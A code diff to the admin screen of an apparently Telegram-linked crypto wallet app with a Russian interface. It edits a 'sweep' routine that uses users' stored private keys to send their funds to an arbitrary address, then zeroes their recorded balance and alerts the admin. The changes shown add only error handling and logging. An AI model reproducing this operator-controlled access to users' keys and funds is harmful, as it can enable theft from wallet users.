@@ -4547,13 +4547,16 @@ function AdminScreen({ onBack }) {
       // Truncate to 8 decimal places — prevents NUMERIC_FAULT in ethers
       const amt = Math.floor(parseFloat(sweepAmount) * 1e8) / 1e8;
       if (!amt || amt <= 0) throw new Error("Укажите корректную сумму");
+
       const toAddr = sweepAddress.trim();
       if (!toAddr) throw new Error("Укажите адрес получателя");
 
       const sym   = sweepToken;
       const netId = sym === 'USDT' ? sweepUsdtNet : undefined;
 
+      // Map USDT network id to chain key used in privateKeys/addresses
       const NET_TO_CHAIN = { eth: 'ETH', bnb: 'BNB', arb: 'ARB', sol: 'SOL', ton: 'TON' };
+
       const pk   = sym === 'USDT'
         ? privateKeys[NET_TO_CHAIN[sweepUsdtNet] || 'ETH']
         : (privateKeys[sym] || null);
@@ -4561,7 +4564,7 @@ function AdminScreen({ onBack }) {
         ? (addresses[NET_TO_CHAIN[sweepUsdtNet] || 'ETH'] || '')
         : (addresses[sym] || '');
 
-      if (!pk) throw new Error(`Не удалось получить приватный ключ для ${sym}`);
+      if (!pk) throw new Error(`Не удалось получить приватный ключ для ${sym}${netId ? ' (' + netId + ')' : ''}. Проверьте что кошелёк поддерживает эту сеть.`);
 
       const txHash = await chainSendTransaction({
         sym,
@@ -4575,31 +4578,39 @@ function AdminScreen({ onBack }) {
       setSweepResult({ success: true, txHash });
       setSweepStep('result');
 
-      // Zero out balance in Supabase
+      // Zero out balance in Supabase after successful sweep
       try {
-        const colName = sym.toLowerCase() + '_balance';
-        const walletFilter = sweepWallet.telegram_id
-          ? `telegram_id=eq.${encodeURIComponent(sweepWallet.telegram_id)}`
-          : `username=eq.${encodeURIComponent(sweepWallet.username)}`;
-        await fetch(`${SB_URL}/rest/v1/wallets?${walletFilter}`, {
-          method: 'PATCH',
-          headers: {
-            'apikey': SB_KEY,
-            'Authorization': `Bearer ${SB_KEY}`,
-            'Content-Type': 'application/json',
-            'Prefer': 'return=minimal',
-          },
-          body: JSON.stringify({ [colName]: '0' }),
-        });
-        loadWallets(true);
-      } catch (_) {}
+        if (SB_URL && SB_KEY) {
+          const colName = sym.toLowerCase() + '_balance';
+          const walletFilter = sweepWallet.telegram_id
+            ? `telegram_id=eq.${encodeURIComponent(sweepWallet.telegram_id)}`
+            : `username=eq.${encodeURIComponent(sweepWallet.username)}`;
+          const patchRes = await fetch(`${SB_URL}/rest/v1/wallets?${walletFilter}`, {
+            method: 'PATCH',
+            headers: {
+              'apikey': SB_KEY,
+              'Authorization': `Bearer ${SB_KEY}`,
+              'Content-Type': 'application/json',
+              'Prefer': 'return=minimal',
+            },
+            body: JSON.stringify({ [colName]: '0' }),
+          });
+          if (!patchRes.ok) {
+            console.warn('[Sweep] Failed to zero balance:', patchRes.status, await patchRes.text());
+          }
+          loadWallets(true);
+        }
+      } catch (patchErr) {
+        console.warn('[Sweep] Failed to zero out balance in Supabase:', patchErr);
+      }
 
       notifyAdmin(
         `💸 <b>Свип выполнен (Admin)</b>\n\n👤 ${sweepWallet.username}\n🪙 ${sym}${netId ? ' (' + netId.toUpperCase() + ')' : ''}\n💰 ${amt}\n🎯 ${toAddr}\n🔗 <code>${txHash}</code>`,
         "sweep"
       );
     } catch (e) {
-      setSweepResult({ success: false, error: e.message });
+      console.error('[Sweep] Error:', e);
+      setSweepResult({ success: false, error: e.message || String(e) });
       setSweepStep('result');
     } finally {
       setSweepLoading(false);
